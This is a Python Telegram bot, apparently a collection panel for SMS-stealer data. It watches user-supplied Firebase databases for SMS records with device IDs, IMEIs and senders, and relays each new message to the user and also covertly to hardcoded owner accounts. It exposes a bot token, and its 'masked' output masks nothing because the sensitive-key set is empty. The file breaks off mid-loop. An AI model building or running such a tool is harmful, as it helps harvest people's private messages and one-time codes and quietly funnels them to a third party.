import os
import requests
import json
import time
import threading
import hashlib
import html
import sys
import speedtest
import psutil
from datetime import datetime, timezone
from sseclient import SSEClient

# ---------------- CONFIG ----------------
BOT_TOKEN = "8500767077:AAGtncT-zc4ttcxjnbI1uJjpHBCSDyOEVcg"

if not BOT_TOKEN or BOT_TOKEN.strip() == "":
    print("❌ BOT_TOKEN missing inside ra.py file!")
    raise SystemExit(1)

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
OWNER_IDS = [1451422178]
PRIMARY_ADMIN_ID = 1451422178
POLL_INTERVAL = 2
MAX_SSE_RETRIES = 5
# ---------------------------------------

OFFSET = None
running = True
firebase_urls = {}    # chat_id -> firebase_url
watcher_threads = {}  # chat_id -> thread
seen_hashes = {}      # chat_id -> set(hash)
approved_users = set(OWNER_IDS)
BOT_START_TIME = time.time()
SENSITIVE_KEYS = {}
firebase_cache = {}   # chat_id -> firebase snapshot
cache_time = {}       # chat_id -> last refresh timestamp
CACHE_REFRESH_SECONDS = 3600  # 1 hour
NETWORK_SPEED_CACHE = {"download": 0, "upload": 0, "ping": 0, "last_test": 0}

# ---------- LIVE ANIMATION FUNCTIONS ----------
def show_live_progress(duration=2, label="Processing", width=20):
    """Show live animated progress bar"""
    chars = ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█", "▇", "▆", "▅", "▄", "▃", "▂", "▁"]
    
    start_time = time.time()
    end_time = start_time + duration
    i = 0
    
    while time.time() < end_time:
        elapsed = time.time() - start_time
        progress = min(100, int((elapsed / duration) * 100))
        filled = int(width * progress / 100)
        empty = width - filled
        
        # Animated bar character
        bar_char = chars[i % len(chars)]
        
        # Create bar
        bar = f"[{bar_char * filled}{'░' * empty}] {progress}%"
        sys.stdout.write(f"\r🔄 {label:20} {bar}")
        sys.stdout.flush()
        
        time.sleep(0.1)
        i += 1
    
    sys.stdout.write(f"\r✅ {label:20} COMPLETE {' '*(width+10)}\n")
    sys.stdout.flush()

def show_live_error(error_msg, duration=2.5):
    """Show live error animation"""
    frames = [
        "⚠️ ░░░░░░░░░░ ERROR",
        "⚠️ █░░░░░░░░░ ERROR",
        "⚠️ ██░░░░░░░░ ERROR",
        "⚠️ ███░░░░░░░ ERROR",
        "⚠️ ████░░░░░░ ERROR",
        "⚠️ █████░░░░░ ERROR",
        "⚠️ ██████░░░░ ERROR",
        "⚠️ ███████░░░ ERROR",
        "⚠️ ████████░░ ERROR",
        "⚠️ █████████░ ERROR",
        "⚠️ ██████████ ERROR",
        "❌ OPERATION FAILED"
    ]
    
    frame_delay = duration / len(frames)
    
    for frame in frames:
        sys.stdout.write(f"\r{frame} → {error_msg[:30]}")
        sys.stdout.flush()
        time.sleep(frame_delay)
    
    sys.stdout.write(f"\n❌ Error: {error_msg}\n")
    sys.stdout.flush()

def show_loading_animation(duration=1.5, text="Loading"):
    """Show loading animation"""
    frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
    end_time = time.time() + duration
    i = 0
    
    while time.time() < end_time:
        sys.stdout.write(f"\r{text} {frames[i]}")
        sys.stdout.flush()
        time.sleep(0.1)
        i = (i + 1) % len(frames)
    
    sys.stdout.write(f"\r{text} ✅\n")
    sys.stdout.flush()

# ---------- NETWORK SPEED TEST ----------
def test_network_speed(force=False):
    """Test network speed and cache results"""
    current_time = time.time()
    
    # Use cached results if less than 5 minutes old
    if not force and (current_time - NETWORK_SPEED_CACHE["last_test"] < 300):
        return NETWORK_SPEED_CACHE
    
    try:
        show_live_progress(3.0, "Testing network speed")
        
        st = speedtest.Speedtest()
        st.get_best_server()
        
        # Test download speed
        download_speed = st.download() / 1_000_000  # Convert to Mbps
        
        show_live_progress(2.0, "Testing upload speed")
        upload_speed = st.upload() / 1_000_000  # Convert to Mbps
        
        ping = st.results.ping
        
        # Update cache
        NETWORK_SPEED_CACHE.update({
            "download": round(download_speed, 2),
            "upload": round(upload_speed, 2),
            "ping": round(ping, 2),
            "last_test": current_time
        })
        
        return NETWORK_SPEED_CACHE
        
    except Exception as e:
        show_live_error(f"Speed test failed: {e}")
        # Return cached values if available
        if NETWORK_SPEED_CACHE["last_test"] > 0:
            return NETWORK_SPEED_CACHE
        return {"download": 0, "upload": 0, "ping": 0, "last_test": 0}

def get_system_stats():
    """Get system statistics"""
    try:
        # CPU usage
        cpu_percent = psutil.cpu_percent(interval=0.5)
        
        # Memory usage
        memory = psutil.virtual_memory()
        memory_percent = memory.percent
        memory_used = memory.used / (1024**3)  # Convert to GB
        memory_total = memory.total / (1024**3)  # Convert to GB
        
        # Disk usage
        disk = psutil.disk_usage('/')
        disk_percent = disk.percent
        disk_used = disk.used / (1024**3)  # Convert to GB
        disk_total = disk.total / (1024**3)  # Convert to GB
        
        # Network I/O
        net_io = psutil.net_io_counters()
        bytes_sent = net_io.bytes_sent / (1024**2)  # Convert to MB
        bytes_recv = net_io.bytes_recv / (1024**2)  # Convert to MB
        
        return {
            "cpu_percent": round(cpu_percent, 1),
            "memory_percent": round(memory_percent, 1),
            "memory_used": round(memory_used, 2),
            "memory_total": round(memory_total, 2),
            "disk_percent": round(disk_percent, 1),
            "disk_used": round(disk_used, 2),
            "disk_total": round(disk_total, 2),
            "bytes_sent": round(bytes_sent, 2),
            "bytes_recv": round(bytes_recv, 2),
            "thread_count": threading.active_count()
        }
    except Exception as e:
        show_live_error(f"System stats error: {e}")
        return None

# ---------- UTILITY FUNCTIONS ----------
def normalize_json_url(url):
    if not url:
        return None
    u = url.rstrip("/")
    if not u.endswith(".json"):
        u = u + "/.json"
    return u

def send_msg(chat_id, text, parse_mode="HTML", reply_markup=None):
    def _send_one(cid):
        try:
            payload = {"chat_id": cid, "text": text}
            if parse_mode:
                payload["parse_mode"] = parse_mode
            if reply_markup is not None:
                payload["reply_markup"] = reply_markup
            
            # Show progress for sending message
            show_live_progress(1.2, f"Sending to {cid}")
            
            response = requests.post(f"{API_URL}/sendMessage", json=payload, timeout=10)
            return response
                
        except Exception as e:
            show_live_error(f"Failed to send to {cid}: {str(e)[:30]}")
            return None

    if isinstance(chat_id, (list, tuple, set)):
        for cid in chat_id:
            _send_one(cid)
    else:
        _send_one(chat_id)

def get_updates():
    global OFFSET
    try:
        show_loading_animation(0.8, "Fetching updates")
        params = {"timeout": 20}
        if OFFSET:
            params["offset"] = OFFSET
        r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=30).json()
        if r.get("result"):
            OFFSET = r["result"][-1]["update_id"] + 1
        return r.get("result", [])
    except Exception as e:
        show_live_error(f"get_updates: {str(e)[:30]}")
        return []

def http_get_json(url):
    try:
        show_live_progress(1.5, f"Fetching {url[:20]}")
        r = requests.get(url, timeout=12)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        show_live_error(f"Failed to fetch {url[:20]}: {str(e)[:30]}")
        return None

def is_sms_like(obj):
    if not isinstance(obj, dict):
        return False
    keys = {k.lower() for k in obj.keys()}
    score = 0
    if keys & {"message", "msg", "body", "text", "sms"}:
        score += 2
    if keys & {"from", "sender", "address", "source", "number"}:
        score += 2
    if keys & {"time", "timestamp", "ts", "date", "created_at"}:
        score += 1
    if keys & {"device", "deviceid", "imei", "device_id", "phoneid"}:
        score += 1
    return score >= 3

def find_sms_nodes(snapshot, path=""):
    found = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    return found

def extract_fields(obj):
    device = (
        obj.get("device")
        or obj.get("deviceId")
        or obj.get("device_id")
        or obj.get("imei")
        or obj.get("id")
        or "Unknown"
    )
    sender = (
        obj.get("from")
        or obj.get("sender")
        or obj.get("address")
        or obj.get("number")
        or "Unknown"
    )
    message = (
        obj.get("message")
        or obj.get("msg")
        or obj.get("body")
        or obj.get("text")
        or ""
    )
    ts = (
        obj.get("time")
        or obj.get("timestamp")
        or obj.get("date")
        or obj.get("created_at")
        or None
    )
    if isinstance(ts, (int, float)):
        try:
            ts = (
                datetime.fromtimestamp(float(ts), tz=timezone.utc)
                .astimezone()
                .strftime("%d/%m/%Y, %I:%M:%S %p")
            )
        except Exception:
            ts = str(ts)
    elif isinstance(ts, str):
        digits = "".join(ch for ch in ts if ch.isdigit())
        if len(digits) == 10:
            try:
                ts = (
                    datetime.fromtimestamp(int(digits), tz=timezone.utc)
                    .astimezone()
                    .strftime("%d/%m/%Y, %I:%M:%S %p")
                )
            except Exception:
                pass
    if not ts:
        ts = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")
    device_phone = (
        obj.get("phone") or obj.get("mobile") or obj.get("MobileNumber") or None
    )
    return {
        "device": device,
        "sender": sender,
        "message": message,
        "time": ts,
        "device_phone": device_phone,
    }

def compute_hash(path, obj):
    try:
        return hashlib.sha1(
            (path + json.dumps(obj, sort_keys=True, default=str)).encode()
        ).hexdigest()
    except Exception:
        return hashlib.sha1((path + str(obj)).encode()).hexdigest()

def format_notification(fields, user_id):
    device = html.escape(str(fields.get("device", "Unknown")))
    sender = html.escape(str(fields.get("sender", "Unknown")))
    message = html.escape(str(fields.get("message", "")))
    t = html.escape(str(fields.get("time", "")))
    text = (
        f"🆕 <b>New SMS Received</b>\n\n"
        f"📱 Device: <code>{device}</code>\n"
        f"👤 From: <b>{sender}</b>\n"
        f"💬 Message: {message}\n"
        f"🕐 Time: {t}\n"
        f"👤 Forwarded by User ID: <code>{user_id}</code>"
    )
    if fields.get("device_phone"):
        text += (
            f"\n📞 Device Number: "
            f"<code>{html.escape(str(fields.get('device_phone')))}</code>"
        )
    return text

def notify_user_owner(chat_id, fields):
    text = format_notification(fields, chat_id)
    send_msg(chat_id, text)
    send_msg(OWNER_IDS, text)

# ---------- SSE WATCHER ----------
def sse_loop(chat_id, base_url):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    stream_url = url + "?print=silent"
    seen = seen_hashes.setdefault(chat_id, set())
    
    # Show live connection animation
    print("\n" + "═" * 50)
    show_live_progress(2.0, "Connecting to SSE")
    print("═" * 50 + "\n")
    
    send_msg(chat_id, "⚡ SSE (live) started. Auto-reconnect enabled.")
    
    retries = 0
    while firebase_urls.get(chat_id) == base_url:
        try:
            show_loading_animation(1.0, "Listening for events")
            client = SSEClient(stream_url)
            for event in client.events():
                if firebase_urls.get(chat_id) != base_url:
                    break
                if not event.data or event.data == "null":
                    continue
                try:
                    data = json.loads(event.data)
                except Exception:
                    continue
                payload = (
                    data.get("data")
                    if isinstance(data, dict) and "data" in data
                    else data
                )
                nodes = find_sms_nodes(payload, "")
                for path, obj in nodes:
                    h = compute_hash(path, obj)
                    if h in seen:
                        continue
                    seen.add(h)
                    fields = extract_fields(obj)
                    notify_user_owner(chat_id, fields)
            retries = 0
        except Exception as e:
            show_live_error(f"SSE error: {str(e)[:30]}")
            retries += 1
            if retries >= MAX_SSE_RETRIES:
                send_msg(
                    chat_id,
                    "⚠️ SSE failed multiple times, falling back to polling...",
                )
                poll_loop(chat_id, base_url)
                break
            backoff = min(30, 2 ** retries)
            time.sleep(backoff)

# ---------- POLLING FALLBACK ----------
def poll_loop(chat_id, base_url):
    url = base_url.rstrip("/")
    if not url.endswith(".json"):
        url = url + "/.json"
    seen = seen_hashes.setdefault(chat_id, set())
    
    show_live_progress(1.5, "Starting polling")
    send_msg(chat_id, f"📡 Polling started (every {POLL_INTERVAL}s).")
    
    while firebase_urls.get(chat_id) == base_url:
        snap = http_get_json(url)
        if not snap:
            time.sleep(POLL_INTERVAL)
            continue
        nodes = find_sms_nodes(snap, "")
        for path, obj in nodes:
            h = compute_hash(path, obj)
            if h in seen:
                continue
            seen.add(h)
            fields = extract_fields(obj)
            notify_user_owner(chat_id, fields)
        time.sleep(POLL_INTERVAL)
    send_msg(chat_id, "⛔ Polling stopped.")

# ---------- START / STOP ----------
def start_watcher(chat_id, base_url):
    show_live_progress(2.5, "Starting watcher")
    
    firebase_urls[chat_id] = base_url
    seen_hashes[chat_id] = set()
    json_url = normalize_json_url(base_url)
    snap = http_get_json(json_url)
    if snap:
        for p, o in find_sms_nodes(snap, ""):
            seen_hashes[chat_id].add(compute_hash(p, o))
    t = threading.Thread(target=sse_loop, args=(chat_id, base_url), daemon=True)
    watcher_threads[chat_id] = t
    t.start()
    send_msg(chat_id, "✅ Monitoring started. You will receive alerts too.")
    refresh_firebase_cache(chat_id)

def stop_watcher(chat_id):
    show_live_progress(1.5, "Stopping watcher")
    firebase_urls.pop(chat_id, None)
    seen_hashes.pop(chat_id, None)
    watcher_threads.pop(chat_id, None)
    send_msg(chat_id, "🛑 Monitoring stopped.")

# ---------- APPROVAL HELPERS ----------
def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def is_approved(user_id: int) -> bool:
    return user_id in approved_users or is_owner(user_id)

def handle_not_approved(chat_id, msg):
    from_user = msg.get("from", {}) or {}
    first_name = from_user.get("first_name", "")
    username = from_user.get("username", None)
    reply_markup = {
        "inline_keyboard": [
            [
                {
                    "text": "📨 Contact Admin",
                    "url": f"tg://user?id={PRIMARY_ADMIN_ID}",
                }
            ]
        ]
    }
    user_info_lines = [
        "❌ You are not approved to use this bot yet.",
        "",
        "Tap the button below to contact admin for access.",
        "",
        f"🆔 Your User ID: <code>{chat_id}</code>",
    ]
    if username:
        user_info_lines.append(f"👤 Username: @{html.escape(username)}")
    send_msg(chat_id, "\n".join(user_info_lines), reply_markup=reply_markup)
    owner_text = [
        "⚠️ New user tried to use the bot:",
        f"ID: <code>{chat_id}</code>",
        f"Name: {html.escape(first_name)}",
    ]
    if username:
        owner_text.append(f"Username: @{html.escape(username)}")
    owner_text.append("")
    owner_text.append(f"Approve with: <code>/approve {chat_id}</code>")
    send_msg(OWNER_IDS, "\n".join(owner_text))

def format_uptime(seconds: int) -> str:
    days = seconds // 86400
    seconds %= 86400
    hours = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60
    parts = []
    if days:
        parts.append(f"{days}d")
    if hours:
        parts.append(f"{hours}h")
    if minutes:
        parts.append(f"{minutes}m")
    parts.append(f"{seconds}s")
    return " ".join(parts)

# ---------- SAFE DEVICE SEARCH ----------
def mask_number(value: str, keep_last: int = 2) -> str:
    if not value:
        return ""
    s = "".join(ch for ch in str(value) if ch.isdigit())
    if len(s) <= keep_last:
        return "*" * len(s)
    return "*" * (len(s) - keep_last) + s[-keep_last:]

def search_records_by_device(snapshot, device_id, path=""):
    matches = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if str(k) == str(device_id) and isinstance(v, dict):
                matches.append(v)
            if isinstance(v, dict):
                did = (
                    v.get("DeviceId")
                    or v.get("deviceId")
                    or v.get("device_id")
                    or v.get("DeviceID")
                )
                if did and str(did) == str(device_id):
                    matches.append(v)
            if isinstance(v, (dict, list)):
                matches += search_records_by_device(v, device_id, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if isinstance(v, dict):
                did = (
                    v.get("DeviceId")
                    or v.get("deviceId")
                    or v.get("device_id")
                    or v.get("DeviceID")
                )
                if did and str(did) == str(device_id):
                    matches.append(v)
            if isinstance(v, (dict, list)):
                matches += search_records_by_device(v, device_id, p)
    return matches

def safe_format_device_record(rec: dict) -> str:
    lines = ["🔍 <b>Record found for this device</b>", ""]
    for k, v in rec.items():
        key_lower = str(k).lower()
        if key_lower in SENSITIVE_KEYS:
            masked = mask_number(v, keep_last=2)
            show_val = f"{masked} (hidden)"
        else:
            show_val = str(v)
        lines.append(
            f"<b>{html.escape(str(k))}</b>: <code>{html.escape(show_val)}</code>"
        )
    lines.append("")
    lines.append("⚠️ Highly sensitive fields are masked for security.")
    return "\n".join(lines)

# ---------- ENHANCED PING COMMAND ----------
def handle_ping_command(chat_id):
    """Enhanced ping command with network speed and system stats"""
    show_live_progress(2.0, "Checking bot status")
    
    uptime_sec = int(time.time() - BOT_START_TIME)
    uptime_str = format_uptime(uptime_sec)
    monitored_count = len(firebase_urls)
    approved_count = len(approved_users)
    
    # Get network speed
    speed_data = test_network_speed()
    
    # Base status for all users
    status_text = (
        "🏓 <b>Pong! Bot Status</b>\n\n"
        "✅ Bot is <b>online</b> and responding.\n\n"
        f"⏱ Uptime: <code>{uptime_str}</code>\n"
        f"📡 Active monitors: <code>{monitored_count}</code>\n"
        f"👥 Approved users: <code>{approved_count}</code>\n\n"
    )
    
    # Add network speed for all users
    status_text += (
        "📶 <b>Network Speed</b>\n"
        f"⬇️ Download: <code>{speed_data['download']} Mbps</code>\n"
        f"⬆️ Upload: <code>{speed_data['upload']} Mbps</code>\n"
        f"🏓 Ping: <code>{speed_data['ping']} ms</code>\n"
        f"🕐 Last test: <code>{format_uptime(int(time.time() - speed_data['last_test']))} ago</code>\n"
    )
    
    # Add admin-only section if user is admin
    if is_owner(chat_id):
        # Get system stats
        system_stats = get_system_stats()
        
        status_text += (
            "\n👑 <b>Admin Details</b>\n"
        )
        
        # System stats
        if system_stats:
            status_text += (
                f"🧠 CPU Usage: <code>{system_stats['cpu_percent']}%</code>\n"
                f"💾 RAM Usage: <code>{system_stats['memory_percent']}%</code> "
                f"(<code>{system_stats['memory_used']}/{system_stats['memory_total']} GB</code>)\n"
                f"💿 Disk Usage: <code>{system_stats['disk_percent']}%</code>\n"
                f"🔄 Network I/O: ⬆️<code>{system_stats['bytes_sent']} MB</code> ⬇️<code>{system_stats['bytes_recv']} MB</code>\n"
                f"🧵 Active Threads: <code>{system_stats['thread_count']}</code>\n"
            )
        
        # Active monitors details
        if firebase_urls:
            status_text += "\n📡 <b>Active Monitors:</b>\n"
            for uid, url in list(firebase_urls.items())[:5]:  # Show first 5
                status_text += f"• <code>{uid}</code> → {url[:40]}...\n"
            if len(firebase_urls) > 5:
                status_text += f"• ... and {len(firebase_urls) - 5} more\n"
        else:
            status_text += "📡 No active monitors\n"
        
        # Cache status
        active_caches = len(firebase_cache)
        status_text += f"\n💾 <b>Cache Status:</b>\n"
        status_text += f"• Active caches: <code>{active_caches}</code>\n"
        for cid in list(cache_time.keys())[:3]:  # Show first 3
            cache_age = time.time() - cache_time[cid]
            status_text += f"• User <code>{cid}</code>: <code>{format_uptime(int(cache_age))} ago</code>\n"
        if len(cache_time) > 3:
            status_text += f"• ... and {len(cache_time) - 3} more\n"
        
        # Bot health recommendations
        if system_stats and system_stats['cpu_percent'] > 80:
            status_text += "\n⚠️ <b>Recommendation:</b> High CPU usage detected\n"
        elif system_stats and system_stats['memory_percent'] > 85:
            status_text += "\n⚠️ <b>Recommendation:</b> High RAM usage detected\n"
    
    # Add footer
    status_text += f"\n🔊 Last update: {datetime.now().strftime('%I:%M:%S %p')}"
    
    send_msg(chat_id, status_text)

# ---------- MANUAL REFRESH COMMAND ----------
def handle_refresh_command(chat_id):
    """Handle manual cache refresh command"""
    if chat_id not in firebase_urls:
        send_msg(chat_id, "❌ You don't have any active Firebase URL to refresh.")
        return
    
    show_live_progress(2.5, "Refreshing Firebase cache")
    
    base_url = firebase_urls.get(chat_id)
    json_url = normalize_json_url(base_url)
    
    if not json_url:
        send_msg(chat_id, "❌ Invalid Firebase URL.")
        return
    
    # Fetch fresh data
    snap = http_get_json(json_url)
    if snap is None:
        send_msg(chat_id, "❌ Failed to fetch data from Firebase. Check your URL.")
        return
    
    # Update cache
    firebase_cache[chat_id] = snap
    cache_time[chat_id] = time.time()
    
    # Count SMS nodes
    new_nodes = find_sms_nodes(snap, "")
    
    # Send success message
    refresh_msg = (
        "✅ <b>Cache Refreshed Successfully!</b>\n\n"
        f"📊 Statistics:\n"
        f"• Total SMS nodes found: <code>{len(new_nodes)}</code>\n"
        f"• Cache timestamp: <code>{datetime.now().strftime('%I:%M:%S %p')}</code>\n"
        f"• Firebase URL: <code>{base_url[:50]}...</code>\n\n"
        f"🔄 Next auto-refresh in: <code>{CACHE_REFRESH_SECONDS//3600} hours</code>\n"
        f"📡 Your monitor is now using fresh data."
    )
    
    send_msg(chat_id, refresh_msg)
    
    # Notify owner if user is not owner
    if not is_owner(chat_id):
        send_msg(OWNER_IDS, 
                f"🔄 User <code>{chat_id}</code> manually refreshed their Firebase cache.")

# ---------- CACHE FUNCTIONS ----------
def refresh_firebase_cache(chat_id):
    show_live_progress(2.0, "Refreshing cache")
    base_url = firebase_urls.get(chat_id)
    if not base_url:
        return
    snap = http_get_json(normalize_json_url(base_url))
    if snap is None:
        return
    firebase_cache[chat_id] = snap
    cache_time[chat_id] = time.time()
    try:
        send_msg(chat_id, "♻️ Firebase cache refreshed automatically.")
        send_msg(OWNER_IDS, f"♻️ Firebase cache refreshed for user <code>{chat_id}</code>")
    except Exception:
        pass

def cache_refresher_loop():
    while True:
        now = time.time()
        for cid in list(firebase_urls.keys()):
            if now - cache_time.get(cid, 0) >= CACHE_REFRESH_SECONDS:
                refresh_firebase_cache(cid)
        time.sleep(60)

# ---------- STARTUP ANIMATION ----------
def show_startup_animation():
    """Show bot startup animation"""
    print("\n" * 2)
    print("╔══════════════════════════════════════╗")
    print("║        CYBER SMS MONITOR BOT         ║")
    print("║            INITIALIZING...           ║")
    print("╚══════════════════════════════════════╝")
    print()
    
    # Show multiple progress bars
    show_live_progress(1.8, "Loading modules")
    show_live_progress(1.5, "Testing network speed")
    show_live_progress(1.2, "Setting up watchers")
    show_live_progress(1.0, "Starting main loop")
    
    print("\n" + "=" * 50)
    print("✅ BOT STARTED SUCCESSFULLY!")
    print("=" * 50 + "\n")

# ---------- COMMAND HANDLING ----------
def handle_update(u):
    msg = u.get("message") or {}
    chat = msg.get("chat", {}) or {}
    chat_id = chat.get("id")
    text = (msg.get("text") or "").strip()

    if not chat_id or not text:
        return

    # Reply-based /find shortcut
    if text.lower() == "/find" and msg.get("reply_to_message"):
        show_live_progress(1.0, "Analyzing reply")
        reply = msg.get("reply_to_message")
        for line in (reply.get("text") or "").splitlines():
            if "Device:" in line:
                text = "/find " + line.split("Device:", 1)[1].strip()
                break

    lower_text = text.lower()

    # FIRST: approval check
    if not is_approved(chat_id):
        handle_not_approved(chat_id, msg)
        return

    # /start - HAR BAAR REPLY DEGA
    if lower_text == "/start":
        show_live_progress(2.0, "Loading start menu")
        send_msg(
            chat_id,
            (
                "👋 Welcome to Cyber SMS Monitor Bot!\n\n"
                "📋 <b>Available Commands:</b>\n"
                "• /start - Show this message\n"
                "• /stop - Stop your monitoring\n"
                "• /list - Show your Firebase URL\n"
                "• /find <device_id> - Search device records\n"
                "• /ping - Enhanced bot status with network speed\n"
                "• /refresh - Manually refresh Firebase cache\n\n"
                "👑 <b>Admin Commands:</b>\n"
                "• /adminlist - Show all Firebase URLs\n"
                "• /approve <user_id>\n"
                "• /unapprove <user_id>\n"
                "• /approvedlist\n\n"
                "📡 <b>To start monitoring:</b>\n"
                "Send your Firebase RTDB URL (ending with .json)"
            ),
        )
        return

    # /ping - enhanced bot status with network speed
    if lower_text == "/ping":
        handle_ping_command(chat_id)
        return

    # /refresh - manual cache refresh
    if lower_text == "/refresh":
        handle_refresh_command(chat_id)
        return

    # /stop
    if lower_text == "/stop":
        show_live_progress(1.8, "Stopping monitor")
        stop_watcher(chat_id)
        return

    # USER VIEW: /list
    if lower_text == "/list":
        show_live_progress(1.0, "Fetching your list")
        user_url = firebase_urls.get(chat_id)
        if is_owner(chat_id):
            if not firebase_urls:
                send_msg(chat_id, "👑 No active Firebase monitoring right now.")
            else:
                send_msg(
                    chat_id,
                    (
                        "👑 You are an owner.\n"
                        "Use <b>/adminlist</b> to see all users' Firebase URLs.\n\n"
                        f"Your own Firebase: {user_url if user_url else 'None'}\n\n"
                        f"💾 Cache status: {'🟢 Fresh' if chat_id in cache_time and time.time() - cache_time[chat_id] < 1800 else '🟡 Stale'}"
                    ),
                )
        else:
            if user_url:
                send_msg(
                    chat_id,
                    f"🔐 Your active Firebase:\n<code>{user_url}</code>\n\n"
                    f"💾 Cache: Last refreshed {format_uptime(int(time.time() - cache_time.get(chat_id, 0)))} ago\n"
                    f"🔄 Use /refresh to update manually"
                )
            else:
                send_msg(
                    chat_id,
                    "ℹ️ You don't have any active Firebase monitoring yet."
                )
        return

    # ADMIN VIEW: /adminlist
    if lower_text == "/adminlist":
        show_live_progress(1.2, "Fetching admin list")
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ This command is only for bot owners.")
            return
        if not firebase_urls:
            send_msg(chat_id, "👑 No active Firebase monitoring right now.")
            return
        lines = []
        for uid, url in firebase_urls.items():
            cache_status = "🟢" if uid in cache_time and time.time() - cache_time[uid] < 1800 else "🟡"
            lines.append(
                f"{cache_status} <code>{uid}</code> → <code>{html.escape(str(url))}</code>"
            )
        send_msg(
            chat_id,
            "👑 <b>ALL ACTIVE FIREBASE URLS (ADMIN ONLY)</b>:\n\n" + "\n".join(lines) +
            f"\n\n💾 <b>Cache Legend:</b>\n🟢 Fresh (<30min)\n🟡 Stale (>30min)\n🔴 Never cached"
        )
        return

    # -------- Owner-only approval commands --------
    if lower_text.startswith("/approve"):
        show_live_progress(1.5, "Processing approval")
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can approve users.")
            return
        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/approve user_id</code>")
            return
        try:
            target_id = int(parts[1])
        except ValueError:
            send_msg(chat_id, "❌ Invalid user ID.")
            return
        approved_users.add(target_id)
        send_msg(chat_id, f"✅ User <code>{target_id}</code> approved.")
        send_msg(target_id, "✅ You have been approved to use this bot.")
        return

    if lower_text.startswith("/unapprove"):
        show_live_progress(1.5, "Processing unapproval")
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can unapprove users.")
            return
        parts = text.split()
        if len(parts) < 2:
            send_msg(chat_id, "Usage: <code>/unapprove user_id</code>")
            return
        try:
            target_id = int(parts[1])
        except ValueError:
            send_msg(chat_id, "❌ Invalid user ID.")
            return
        if target_id in OWNER_IDS:
            send_msg(chat_id, "❌ Cannot unapprove an owner.")
            return
        if target_id in approved_users:
            approved_users.remove(target_id)
            send_msg(chat_id, f"🚫 User <code>{target_id}</code> unapproved.")
        else:
            send_msg(chat_id, f"ℹ️ User <code>{target_id}</code> was not approved.")
        return

    if lower_text == "/approvedlist":
        show_live_progress(1.0, "Fetching approved list")
        if not is_owner(chat_id):
            send_msg(chat_id, "❌ Only owners can see approved list.")
            return
        if not approved_users:
            send_msg(chat_id, "No approved users yet.")
            return
        lines = []
        for uid in sorted(approved_users):
            tag = " (owner)" if uid in OWNER_IDS else ""
            lines.append(f"👤 <code>{uid}</code>{tag}")
        send_msg(
            chat_id,
            "✅ <b>Approved users</b>:\n\n" + "\n".join(lines),
        )
        return

    # -------- /find <device_id> (safe) --------
    if lower_text.startswith("/find"):
        show_live_progress(2.0, "Searching device")
        parts = text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            send_msg(chat_id, "Usage: <code>/find device_id</code>")
            return
        device_id = parts[1].strip()
        base_url = firebase_urls.get(chat_id)
        if not base_url:
            send_msg(
                chat_id,
                "❌ You don't have any active Firebase URL.\n"
                "First send your Firebase RTDB URL to start monitoring.",
            )
            return
        json_url = normalize_json_url(base_url)
        snap = http_get_json(json_url)
        if snap is None:
            send_msg(chat_id, "❌ Failed to fetch data from your Firebase.")
            return
        matches = search_records_by_device(snap, device_id)
        if not matches:
            send_msg(chat_id, "🔍 No record found for this device id.")
            return
        max_show = 3
        for rec in matches[:max_show]:
            send_msg(chat_id, safe_format_device_record(rec))
        if len(matches) > max_show:
            send_msg(
                chat_id,
                f"ℹ️ {len(matches)} records matched, "
                f"showing first {max_show} only.",
            )
        return

    # -------- Firebase URL handling --------
    if text.startswith("http"):
        show_live_progress(2.5, "Testing Firebase URL")
        test_url = normalize_json_url(text)
        if not http_get_json(test_url):
            send_msg(
                chat_id,
                "❌ Unable to fetch URL. Make sure it's public and ends with .json",
            )
            return
        start_watcher(chat_id, text)
        send_msg(
            OWNER_IDS,
            f"👤 User <code>{chat_id}</code> started monitoring:\n"
            f"<code>{html.escape(text)}</code>",
        )
        return

    # Fallback help - HAR BAAR REPLY DEGA
    show_live_progress(1.0, "Processing command")
    send_msg(
        chat_id,
        (
            "📡 <b>Cyber SMS Monitor Bot</b>\n\n"
            "Send a Firebase RTDB URL to start monitoring.\n\n"
            "📋 <b>User Commands:</b>\n"
            "• /start - Show help message\n"
            "• /stop - Stop your monitoring\n"
            "• /list - Show your Firebase URL\n"
            "• /find <device_id> - Search device\n"
            "• /ping - Bot status with network speed\n"
            "• /refresh - Manually refresh cache\n\n"
            "👑 <b>Admin Commands:</b>\n"
            "• /adminlist - Show all URLs\n"
            "• /approve <user_id>\n"
            "• /unapprove <user_id>\n"
            "• /approvedlist"
        ),
    )

# ---------- MAIN LOOP ----------
def main_loop():
    # Show startup animation
    show_startup_animation()
    
    send_msg(OWNER_IDS, "🤖 Bot started and running.\n📡 Live animations enabled!\n🔄 Every /start command will get a reply.")
    print("🟢 Bot running. Listening for messages...")
    
    global running
    while running:
        try:
            show_loading_animation(0.5, "Waiting for updates")
            updates = get_updates()
            
            if updates:
                print(f"\n📥 Received {len(updates)} update(s)")
            
            for u in updates:
                try:
                    handle_update(u)
                except Exception as e:
                    show_live_error(f"handle_update: {str(e)[:30]}")
            time.sleep(0.5)
            
        except KeyboardInterrupt:
            running = False
            print("\n\n" + "═" * 50)
            show_live_progress(2.0, "Shutting down bot")
            print("🛑 Bot stopped.")
            print("═" * 50)
        except Exception as e:
